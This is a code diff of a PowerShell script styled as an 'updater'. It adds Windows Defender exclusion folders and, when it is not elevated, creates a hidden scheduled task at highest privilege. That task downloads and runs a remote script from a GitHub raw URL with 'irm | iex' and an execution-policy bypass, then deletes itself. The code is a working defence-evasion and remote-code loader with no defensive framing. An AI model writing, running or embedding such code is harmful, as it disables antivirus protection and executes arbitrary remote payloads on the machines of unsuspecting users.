@@ -1,67 +1,66 @@
-# Define a log file path
+# =============================
+# PowerShell Boot-Safe Exclusion Script with UAC Trigger
+# =============================
+
 $logPath = "C:\Windows\Temp\updater_log.txt"
 
 function Write-Log {
     param ($msg)
-    $ts = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-    $ts | Out-File -FilePath $logPath -Append -Encoding utf8
+    $timestamp = "[{0}] $msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+    $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-Write-Log "\uD83D\uDD52 Boot-time script executed. Preparing 1-minute delayed task..."
+# Write basic info
+Write-Log "Script executed by user: $env:USERNAME"
 
-# Task Name
-$taskName = "UpdaterUACDelayed"
+# Check if running interactively and as administrator
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
+$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+$isInteractive = ([Environment]::UserInteractive)
 
-# Clean up old task if any
-schtasks /Delete /TN $taskName /F | Out-Null
+if (-not $isAdmin -or -not $isInteractive) {
+    Write-Log "⏳ Not in interactive user context or not admin. Deferring to scheduled task..."
 
-# Path to temporary elevated script
-$tempScriptPath = "$env:TEMP\exclusion_elevated.ps1"
+    # Prepare a scheduled task to run this script with admin rights and UAC
+    $taskName = "UpdaterUACTrigger"
+    $taskScript = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex\""
 
-# Elevated script content
-$elevatedScript = @"
-# Elevation logic
-\$logPath = '$logPath'
-function Write-Log {
-    param (\$msg)
-    \$ts = "[{0}] \$msg" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
-    \$ts | Out-File -FilePath \$logPath -Append -Encoding utf8
+    # Clean any previous task
+    schtasks.exe /Delete /TN $taskName /F 2>$null | Out-Null
+
+    # Create new task to run after 1 minute
+    $time = (Get-Date).AddMinutes(1).ToString("HH:mm")
+    schtasks.exe /Create /TN $taskName /TR "$taskScript" /SC ONCE /ST $time /RL HIGHEST /F | Out-Null
+
+    Write-Log "✅ Scheduled task '$taskName' created."
+    exit
 }
 
-Write-Log "\u26A1 Elevated exclusion script started as: \$(whoami)"
+Write-Log "Running as admin. Attempting to add exclusions..."
 
-# Define folder to exclude
-\$folder = "\$env:USERPROFILE\TestSafeFolder"
-if (-not (Test-Path \$folder)) {
-    New-Item -ItemType Directory -Force -Path \$folder | Out-Null
-    Write-Log "Created folder: \$folder"
+$foldersToEnsure = @(
+    "$env:USERPROFILE\TestSafeFolder",
+    "C:\TestFolder1",
+    "C:\TestFolder2"
+)
+
+foreach ($folder in $foldersToEnsure) {
+    try {
+        if (-not (Test-Path $folder)) {
+            New-Item -ItemType Directory -Path $folder -Force | Out-Null
+        }
+        Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
+        Write-Log "✅ Added exclusion: $folder"
+    }
+    catch {
+        Write-Log "❌ Failed to add exclusion: $folder. Error: $_"
+    }
 }
 
-# Try adding exclusion
-try {
-    Add-MpPreference -ExclusionPath \$folder -ErrorAction Stop
-    Write-Log "\u2705 Successfully added exclusion: \$folder"
-} catch {
-    Write-Log "\u274C Failed to add exclusion: \$folder. Error: \$_"
-}
+# Clean up the task if it exists
+$taskName = "UpdaterUACTrigger"
+schtasks.exe /Delete /TN $taskName /F 2>$null | Out-Null
+Write-Log "🧹 Deleted scheduled task: $taskName (if it existed)"
 
-# Clean up task
-schtasks /Delete /TN '$taskName' /F | Out-Null
-Write-Log "\uD83D\uDDD1 Deleted scheduled task: $taskName"
-"@
-
-# Write temp elevated script to file
-$elevatedScript | Out-File -FilePath $tempScriptPath -Encoding utf8
-
-# Payload to run elevated script
-$payload = "powershell.exe -ExecutionPolicy Bypass -File `"$tempScriptPath`""
-
-# Create scheduled task with delay
-schtasks /Create /TN $taskName `
-    /TR $payload `
-    /SC ONLOGON `
-    /RL HIGHEST `
-    /DELAY 0001:00 `
-    /F | Out-Null
-
-Write-Log "\u2705 Scheduled task '$taskName' created to run 1 minute after login."
+Write-Log "✅ Script completed."
